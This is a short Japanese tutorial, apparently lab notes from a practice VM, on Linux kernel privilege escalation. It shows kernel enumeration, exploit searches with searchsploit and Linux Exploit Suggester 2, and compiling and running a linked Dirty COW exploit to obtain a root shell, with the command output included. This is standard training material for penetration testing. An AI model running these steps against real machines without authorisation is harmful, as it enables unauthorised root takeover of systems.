カーネルエクスプロイトの発見  
カーネルエクスプロイトの発見と使用は、通常、簡単なプロセスです。   
1. カーネルバージョンを列挙する (uname -a).   
2. 一致するエクスプロイトを見つける（Google、ExploitDB、GitHub）。   
3. コンパイルして実行する。  

ただし、カーネルエクスプロイトは不安定な場合が多いので、注意が必要です。   
システムクラッシュを引き起こす可能性があります。
# Privilege Escalation
1. カーネルバージョンを列挙する。
```
$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
```
2. searchsploitを使用して、一致するエクスプロイトを検索します。
```
# searchsploit linux kernel 2.6.32 priv esc
```
なお、いずれの悪用もLinuxのディストリビューション（Debian）とは一致しません。   
3. カーネルのバージョンはあまり特定せず、ディストリビューションをより特定するように検索を調整することができます。   
```
# searchsploit linux kernel 2.6 priv esc debian
```
今回も、様々な理由で使えないエクスプロイトがいくつか出てきます。   
4. Linux Exploit Suggester 2 (https://github.com/jondonas/linux-exploitsuggester- 2)をインストールし、オリジナルのカーネルバージョンに対してツールを実行します。   
```
# ./linux-exploit-suggester-2.pl –k 2.6.32
```
これにより、一般的なカーネルエクスプロイト（Dirty COW）が明らかになりました。   
5. Dirty COWエクスプロイトには、rootシェルを取得するために異なる方法を使用するものが多数存在します。以下のバージョンは、練習用VM上で最もよく機能するようです。   
 https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54   
 6. ダウンロードし、ファイルに記載されている手順でコンパイルしてください。
```
$ gcc -pthread c0w.c -o c0w
```
7. エクスプロイトを実行する。
```
$ ./c0w
```
8. 悪用が完了したら、/usr/bin/passwd バイナリを実行するだけで、root シェルを取得することができます。
```
$ /usr/bin/passwd
root@debian:/home/user# id
uid=0(root) gid=1000(user) groups=0(root) ...
```
